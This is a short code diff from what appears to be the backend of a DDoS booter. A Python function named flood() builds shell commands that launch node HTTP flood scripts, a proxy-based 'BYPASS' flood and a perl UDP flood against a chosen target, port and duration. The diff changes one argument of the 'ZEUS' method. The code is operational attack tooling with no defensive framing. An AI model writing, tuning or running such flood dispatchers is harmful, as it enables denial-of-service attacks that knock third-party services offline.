@@ -72,7 +72,7 @@ def flood():
         if method == "BYPASS":
             cmd = f"cd /root && {screen_cmd} node wabas.js {target} {time} 60 2 proxy.txt"
         elif method == "ZEUS":
-            cmd = f"cd /root && {screen_cmd} node flood.js {target} {time} 60 2"
+            cmd = f"cd /root && {screen_cmd} node flood.js {target} {time} 60 3"
         elif method == "UDP":
             cmd = f"cd /root && {screen_cmd} perl private.pl {target} {port} 5000 {time}"
         elif method == "HTTP-MIX":
